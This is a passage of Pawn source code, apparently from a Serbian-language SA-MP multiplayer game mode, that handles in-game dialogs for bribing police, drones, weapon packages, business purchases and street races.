        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
        SetCameraBehindPlayer( playerid );
        TogglePlayerControllable( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        SetPlayerVirtualWorld( playerid, 0 );

        SendInfoMessage(playerid, "Uspesno si prodao bitcoin workshop za 600.000$!");

        return 1;
    }

    if(dialogid == dialog_BitcoinPodigni) {

        if(!response) return 0;
        if(response) {

            new btc = strval(inputtext);
            new id = PlayerInfo[playerid][xWorkShopID];

            if(btc < 1 || btc > 1000) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 1000 odjednom!");
            if(BitcoinInfo[id][bNovac] < btc) return SendErrorMessage(playerid, "Nemas toliko bitcoina!");

            PlayerInfo[playerid][xBitcoin] += btc;
            SavePlayer(playerid);

            BitcoinInfo[id][bNovac] -= btc;
            SacuvajBTCWorkShop(id);

            SendInfoMessage(playerid, "Uspesno si podigao %d BTC sa servera! Preostalo : %d BTC!", btc, BitcoinInfo[id][bNovac]);

            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_Bribe) {

        if(!response) return SendInfoMessage(playerid, "Odustao si od ciscenja dosijea!");
        if(response) {

            new cena = PlayerInfo[playerid][xWanted] * 2000;
            if(GetPlayerMoney(playerid) < cena) return SendErrorMessage(playerid, "Nemas dovoljno novca ( $%d )!", cena);

            DajIgracuNovac(playerid, -cena);
            PlayerInfo[playerid][xWanted] = 0;
            Novi_SetPlayerWantedLevel(playerid, 0);
            SavePlayer(playerid);

            SendInfoMessage(playerid, "Platio si %d$ policajcu i on ti je ocistio dosije!", cena);

            if(IsValidActor(BribeActor)) 
                DestroyActor(BribeActor);

            if(IsValidDynamic3DTextLabel(BribeLabel))
                DestroyDynamic3DTextLabel(BribeLabel);

            new bribee = random(sizeof(BribePozicije));
            if(BribeTrenutni == bribee) {

                bribee = random(sizeof(BribePozicije));
            }

            BribeTrenutni = bribee;
            BribeActor = CreateActor(282, BribePozicije[bribee][0], BribePozicije[bribee][1], BribePozicije[bribee][2], BribePozicije[bribee][3]);
            ApplyActorAnimation( BribeActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
            BribeLabel = CreateDynamic3DTextLabel(""col_white"Da podmitite policajca kucajte\n"SRVBOJA1SCM"[ /bribe ]", -1, BribePozicije[bribee][0], BribePozicije[bribee][1], BribePozicije[bribee][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_DeliveryOdabir) {

        if(response) {

            switch(listitem) {

                case 0: { //Legalna

                    DeliveryCP[playerid] = 2;
                    Novi_DisablePlayerCheckpoint(playerid);
                    Novi_SetPlayerCheckpoint(playerid, -492.5044,-518.5037,25.5178, 5.0);

                    SendInfoMessage(playerid, "Odnesi robu na lokaciju!");

                    return 1;
                }
                case 1: { //Ilegalna

                    DeliveryCP[playerid] = 4;
                    Novi_DisablePlayerCheckpoint(playerid);
                    Novi_SetPlayerCheckpoint(playerid, -146.5900,1180.9156,19.7422, 5.0);

                    SendInfoMessage(playerid, "Odnesi robu u na zadatu lokaciju!");

                    return 1;
                }
            }
        }

        return 1;
    }

    if(dialogid == dialog_DronIsteklo) {

        if(!response) {

            SendInfoMessage(playerid, "Istekla ti je voznja drona!");

            Novi_DestroyVehicle( DronVozi[ playerid ] );
            DronVozi[ playerid ] = -1;
            return 1;
        }
        if(response) {

            if(PlayerInfo[playerid][xBaterija] < 1) {

                SendInfoMessage(playerid, "Nemas bateriju!");

                Novi_DestroyVehicle( DronVozi[ playerid ] );
                DronVozi[ playerid ] = -1;
                return 1;
            }

            DronTime[playerid] = 60;
            defer DronVoziloTimer(playerid);
            PlayerInfo[playerid][xBaterija]--;
            SendInfoMessage( playerid, "Ubacio si bateriju u dron!");
            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_OdaberiDron) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: { //Autic

                    if(DronVozi[playerid] != -1) return SendErrorMessage(playerid, "Neki dron je vec aktivan!");
                    if(PlayerInfo[playerid][xDronAuto] == 0) return SendErrorMessage(playerid, "Nemas taj dron!");

                    new Float:Poz[ 3 ];
                    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
                    Novi_DestroyVehicle(DronVozi[playerid]);
                    DronVozi[ playerid ] = V01D_CreateVehicle(441, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, DronVozi[playerid], 0);
                    
                    DronTime[playerid] = 60;
                    defer DronVoziloTimer(playerid);
                    PlayerInfo[playerid][xBaterija]--;
                    SendInfoMessage( playerid, "Dron stvoren, imate 60 sekundi voznje u istom!");
                    SendInfoMessage(playerid, "Da prekines voznju koristi /stopdron !");

                    return 1;
                }
                case 1: { //Helis

                    if(DronVozi[playerid] != -1) return SendErrorMessage(playerid, "Neki dron je vec aktivan!");
                    if(PlayerInfo[playerid][xDronHelis] == 0) return SendErrorMessage(playerid, "Nemas taj dron!");

                    new Float:Poz[ 3 ];
                    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
                    Novi_DestroyVehicle(DronVozi[playerid]);
                    DronVozi[ playerid ] = V01D_CreateVehicle(465, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, DronVozi[playerid], 0);
                    
                    DronTime[playerid] = 60;
                    defer DronVoziloTimer(playerid);
                    PlayerInfo[playerid][xBaterija]--;
                    SendInfoMessage( playerid, "Dron stvoren, imate 60 sekundi voznje u istom!");
                    SendInfoMessage(playerid, "Da prekines voznju koristi /stopdron !");

                    return 1;
                }
            }
        }
        return 1;
    }

    if(dialogid == dialog_KupiDron) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: { //Autic

                    if(GetPlayerMoney(playerid) < 20000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (20.000$)");
                    if(PlayerInfo[playerid][xDronAuto]) return SendErrorMessage(playerid, "Vec imas taj dron!");
                    PlayerInfo[playerid][xDronAuto] = true;
                    DajIgracuNovac(playerid, -20000);
                    SendInfoMessage(playerid, "Uspesno si kupio dron autic! Koristi /dron!");
                    SavePlayer( playerid );
                    return 1;
                }
                case 1: { //Helis

                    if(GetPlayerMoney(playerid) < 25000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (25.000$)");
                    if(PlayerInfo[playerid][xDronHelis]) return SendErrorMessage(playerid, "Vec imas taj dron!");
                    PlayerInfo[playerid][xDronHelis] = true;
                    DajIgracuNovac(playerid, -25000);
                    SendInfoMessage(playerid, "Uspesno si kupio dron helikopter! Koristi /dron!");
                    SavePlayer( playerid );
                    return 1;
                }
                // case 2: { //Avion

                //     if(GetPlayerMoney(playerid) < 30000) return SendErrorMessage(playerid, "Nemas dovoljno novca! (30.000$)");
                //     if(PlayerInfo[playerid][xDronAvion]) return SendErrorMessage(playerid, "Vec imas taj dron!");
                //     PlayerInfo[playerid][xDronAvion] = true;
                //     DajIgracuNovac(playerid, -30000);
                //     SendInfoMessage(playerid, "Uspesno si kupio dron avion! Koristi /dron!");
                //     SavePlayer( playerid );
                //     return 1;
                // }
            }
        }
        return 1;
    }

	if(dialogid == dialog_Poslovi && response) {

        new jobID = listitem + 1;

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, jobsInfos[jobID][jPos][0], jobsInfos[jobID][jPos][1], jobsInfos[jobID][jPos][2], 2.0);
        SendInfoMessage(playerid, "Posao %s prikazan na mapi!", jobsInfos[jobID][jName]);
        PosloviCP[playerid] = true;
        return 1;
    }

    if(dialogid == dialog_HangarUzmi) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    if(HangarPaket1 != 1) return SendErrorMessage(playerid, "Trenutno nemamo taj paket!");
                    GiveWeaponToPlayer(playerid, 34, 10);
                    GiveWeaponToPlayer(playerid, 24, 50);
                    DodajIgracuArmour(playerid, 30);
                    SendInfoMessage(playerid, "Uzeo si Paket 1 iz hangara! Sledeci mozes uzeti za 10 minuta!");
                    PlayerInfo[playerid][xHangarTime] = 10;
                    HangarPaket1 = 0;
                    return 1;
                }

                case 1: {

                    if(HangarPaket2 != 1) return SendErrorMessage(playerid, "Trenutno nemamo taj paket!");
                    GiveWeaponToPlayer(playerid, 31, 150);
                    GiveWeaponToPlayer(playerid, 24, 50);
                    Novi_SetPlayerHealth(playerid, 150);
                    SendInfoMessage(playerid, "Uzeo si Paket 2 iz hangara! Sledeci mozes uzeti za 10 minuta!");
                    PlayerInfo[playerid][xHangarTime] = 10;
                    HangarPaket2 = 0;
                    return 1;
                }

                case 2: {

                    if(HangarPaket3 != 1) return SendErrorMessage(playerid, "Trenutno nemamo taj paket!");
                    GiveWeaponToPlayer(playerid, 30, 150);
                    GiveWeaponToPlayer(playerid, 22, 50);
                    GiveWeaponToPlayer(playerid, 33, 20);
                    SendInfoMessage(playerid, "Uzeo si Paket 3 iz hangara! Sledeci mozes uzeti za 10 minuta!");
                    PlayerInfo[playerid][xHangarTime] = 10;
                    HangarPaket3 = 0;
                    return 1;
                }
            }
        }
        return 1;
    }

    // if(dialogid == dialog_MichaelMisija1Prihvati) {

    //     if(!response) return 0;
    //     if(response) {

    //         SendInfoMessage(playerid, "Odlicno! Idi i resi se pandura!");
    //         MichaelMisija1CP2[playerid] = true;
    //         Novi_SetPlayerCheckpoint(playerid, 2045.6342,-1643.1410,13.5469, 2.0);
    //         GiveWeaponToPlayer(playerid, 22, 50);
    //         return 1;
    //     }
    //     return 1;
    // }

    // if(dialogid == dialog_MichaelMisija1) {

    //     if(!response) return 0;
    //     if(response) {

    //         MichaelMisija1CP[playerid] = true;
    //         Novi_SetPlayerCheckpoint(playerid, 2012.1278,-1763.7977,17.3444, 2.0);
    //         SendInfoMessage(playerid, "Idi do Michaela!");
    //         return 1;
    //     }
    //     return 1;
    // }

    if(dialogid == dialog_GZonaVrsta) {

        if(!response) {

            CreatingGZone[ playerid ] = -1;
            CreatingGZoneID[ playerid ] = -1;
            return 1;
        }

        if(response) {

            new Float:Pos[ 3 ], stringic[ 24 ];
        
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        
            new gzoneid = CreatingGZoneID[playerid];

            gZoneInfo[gzoneid][gZoneVrsta] = listitem;

            gZoneInfo[ gzoneid ][ gZonePickupPos ][ 0 ] = Pos[ 0 ];
            gZoneInfo[ gzoneid ][ gZonePickupPos ][ 1 ] = Pos[ 1 ];
            gZoneInfo[ gzoneid ][ gZonePickupPos ][ 2 ] = Pos[ 2 ];
        
            gZoneInfo[ gzoneid ][ gZoneTaken ] = false;
            gZoneInfo[ gzoneid ][ gZoneTakeable ] = true;
            gZoneInfo[ gzoneid ][ gZoneTime ] = 0;

            if(IsValidDynamicPickup(gZoneInfo[ gzoneid ][ gZonePickup ]))
                DestroyDynamicPickup(gZoneInfo[ gzoneid ][ gZonePickup ]);

            if(IsValidDynamic3DTextLabel(gZoneInfo[gzoneid][gZone3D]))
                DestroyDynamic3DTextLabel(gZoneInfo[gzoneid][gZone3D]);
        
            gZoneInfo[ gzoneid ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ gzoneid ][ gZonePickupPos ][ 0 ], gZoneInfo[ gzoneid ][ gZonePickupPos ][ 1 ], gZoneInfo[ gzoneid ][ gZonePickupPos ][ 2 ], 0, 0 );
            new string[256];
            format(string, sizeof(string), ""col_white"[ TERITORIJA ]\nTeritorija je "col_crvena"slobodna"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi", getZoneType(gzoneid));
            gZoneInfo[ gzoneid ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ gzoneid ][ gZonePickupPos ][ 0 ], gZoneInfo[ gzoneid ][ gZonePickupPos ][ 1 ], gZoneInfo[ gzoneid ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );

            format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ gzoneid ][ gZoneColor ] );
            GangZoneShowForAll( gZoneInfo[ gzoneid ][ gZoneID ], HexToInt( stringic ) );

            GZone_Save( gzoneid );

            CreatingGZone[ playerid ] = -1;
            CreatingGZoneID[ playerid ] = -1; 
            return 1;
        }
    }

    if(dialogid == dialog_LokalKupi) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: { //Market

                    if(GetPlayerMoney(playerid) < Firma_MarketCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_MarketLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 18;
                    BussinesInfo[ IDFirme ][ bExitX ] = -30.9076;
                    BussinesInfo[ IDFirme ][ bExitY ] = -92.0104;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 1003.5469;
                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_MarketCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_MarketLevel;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Prodavnica 24/7", 0, strlen( "Prodavnica 24/7" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_MARKET;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; 

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali market!" );
                    return 1;
                }
                case 1: { //Burg

                    if(GetPlayerMoney(playerid) < Firma_BurgCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_BurgLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 10;
                    BussinesInfo[ IDFirme ][ bExitX ] = 363.1478;
                    BussinesInfo[ IDFirme ][ bExitY ] = -75.1698;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 1001.507812;
                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_BurgCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_BurgLevel;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Burg", 0, strlen( "Burg" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BURG;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; 

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali burg!" );
                    return 1;
                }
                case 2: { //Clucking Bell

                    if(GetPlayerMoney(playerid) < Firma_CluckingCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_CluckingLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 9;
                    BussinesInfo[ IDFirme ][ bExitX ] = 365.0046;
                    BussinesInfo[ IDFirme ][ bExitY ] = -11.8387;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 1001.8516;
                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_CluckingCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_CluckingLevel;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Cluckin Bell", 0, strlen( "Cluckin Bell" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_CLUCK;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali cluckin bell!" );
                    return 1;
                }
                case 3: { //Binco

                    if(GetPlayerMoney(playerid) < Firma_BincoCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_BincoLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 15;
                    BussinesInfo[ IDFirme ][ bExitX ] = 207.7204;
                    BussinesInfo[ IDFirme ][ bExitY ] = -110.5464;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 1005.132812;
                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_BincoCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_BincoLevel;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Binco", 0, strlen( "Binco" ), 128);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BINCO;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali binco!" );
                    return 1;
                }

                case 4: { //Bar

                    if(GetPlayerMoney(playerid) < Firma_BarCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_BarLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 11;
                    BussinesInfo[ IDFirme ][ bExitX ] = 501.870788;
                    BussinesInfo[ IDFirme ][ bExitY ] = -67.582000;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 998.757812;
                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_BarCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_BarLevel;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Bar", 0, strlen( "Bar" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BAR;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali bar!" );
                    return 1;
                }
                case 5: { //Mali Restoran

                    if(GetPlayerMoney(playerid) < Firma_MRestoranCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_MRestoranLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 4;
                    BussinesInfo[ IDFirme ][ bExitX ] = 460.265411;
                    BussinesInfo[ IDFirme ][ bExitY ] = -88.611503;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 999.554687;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Mali Restoran", 0, strlen( "Mali Restoran" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; 

                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_MRestoranCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_MRestoranLevel;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali mali restoran!" );
                    return 1;
                }

                case 6: { //Veliki Restoran

                    if(GetPlayerMoney(playerid) < Firma_VRestoranCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_VRestoranLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 1;
                    BussinesInfo[ IDFirme ][ bExitX ] = -794.850280;
                    BussinesInfo[ IDFirme ][ bExitY ] = 489.279693;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 1376.195312;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Veliki Restoran", 0, strlen( "Veliki Restoran" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_VRestoranCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_VRestoranLevel;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali veliki restoran!" );
                    return 1;
                }
                case 7: { //GunShop

                    if(GetPlayerMoney(playerid) < Firma_GunShopCena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
                    if(PlayerInfo[playerid][xLevel] < Firma_GunShopLevel) return SendErrorMessage(playerid, "Nemas dovoljan level!");

                    new IDFirme = GetNearestBussines(playerid);
                    BussinesInfo[ IDFirme ][ bInInt ] = 0;
                    BussinesInfo[ IDFirme ][ bExitX ] = 2036.6011;
                    BussinesInfo[ IDFirme ][ bExitY ] = -1883.5934;
                    BussinesInfo[ IDFirme ][ bExitZ ] = 999.9080;
                    strmid( BussinesInfo[ IDFirme ][ bName ], "Gun Shop", 0, strlen( "Gun Shop" ), 64);
                    BussinesInfo[ IDFirme ][ bType ] = VRSTA_GUNSHOP;
                    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

                    BussinesInfo[ IDFirme ][ bPrice ] = Firma_GunShopCena;
                    BussinesInfo[ IDFirme ][ bLevel ] = Firma_GunShopLevel;

                    PlayerInfo[ playerid ][ xFirmaID ] = IDFirme;
                    DajIgracuNovac( playerid, -BussinesInfo[ IDFirme ][bPrice] );
                    BussinesInfo[ IDFirme ][ bLocked ] = 0;
                    BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
                    BussinesInfo[ IDFirme ][ bOwned ] = 1;
                    strmid( BussinesInfo[ IDFirme ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
                    Bussines_Refresh( IDFirme );
                    SaveBussines( IDFirme );
                    SavePlayer( playerid );
                    SendInfoMessage( playerid, "Uspesno ste renovirali GunShop!" );
                    return 1;
                }
            }
        }
        return 1;
    }
    
    if(dialogid == dialog_UlicneTrkeIgrac) {

        if(!response) return 0;
        if(response) {

            new id = strval(inputtext);
            if(id == playerid) return SendErrorMessage(playerid, "Ne mozes pozvati samog sebe debilu!");
            if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Igrac nije online!");
            if(UlicneTrkeID[id] >= 0) return SendErrorMessage(playerid, "Igraca je vec neko pozvao!");
            UlicneTrkeID[id] = playerid;
            UlicneTrkeID[playerid] = id;
            SPD(playerid, dialog_UlicneTrkeVozilo, DSL, D_NASLOV, "HotKnife\nTurismo\nHotRing\nSuper GT\nBullet\nEuros\nInfernus\nElegy\nSultan", "Potvrdi", "Odustani");
            return 1;
        }
    } 
    if(dialogid == dialog_UlicneTrkeVozilo) {

        if(!response) return 0;
        if(response) {

            new id = UlicneTrkeID[playerid];

            switch(listitem) {

                case 0: {

                    UlicneTrkeRaceVeh[playerid] = 434;
                    UlicneTrkeRaceVeh[id] = 434;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 1: {

                    UlicneTrkeRaceVeh[playerid] = 451;
                    UlicneTrkeRaceVeh[id] = 451;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 2: {

                    UlicneTrkeRaceVeh[playerid] = 494;
                    UlicneTrkeRaceVeh[id] = 494;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 3: {

                    UlicneTrkeRaceVeh[playerid] = 506;
                    UlicneTrkeRaceVeh[id] = 506;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 4: {

                    UlicneTrkeRaceVeh[playerid] = 541;
                    UlicneTrkeRaceVeh[id] = 541;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 5: {

                    UlicneTrkeRaceVeh[playerid] = 587;
                    UlicneTrkeRaceVeh[id] = 587;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 6: {

                    UlicneTrkeRaceVeh[playerid] = 411;
                    UlicneTrkeRaceVeh[id] = 411;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 7: {

                    UlicneTrkeRaceVeh[playerid] = 562;
                    UlicneTrkeRaceVeh[id] = 562;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
                case 8: {

                    UlicneTrkeRaceVeh[playerid] = 560;
                    UlicneTrkeRaceVeh[id] = 560;
                    ShowPlayerDialog(playerid, dialog_UlicneTrkeUlog, DSI, D_NASLOV, "Unesite ulog ( 1$ - 100000$ )", "Potvrdi", "Odustani");
                    return 1;
                }
            }
        }
        return 1;
    }
    if(dialogid == dialog_UlicneTrkeUlog) {

        new novac = strval(inputtext);
        if(novac < 1 || novac > 100000) {

            UlicneTrkeID[UlicneTrkeID[playerid]] = -1;
            UlicneTrkeID[playerid] = -1;
            SendErrorMessage(playerid, "Ulog ne moze biti manji od 1 i veci od 100.000!");
            return 1;
        }
        UlicneTrkeUlog[playerid] = novac;
        UlicneTrkeUlog[UlicneTrkeID[playerid]] = novac;
        new string[128];
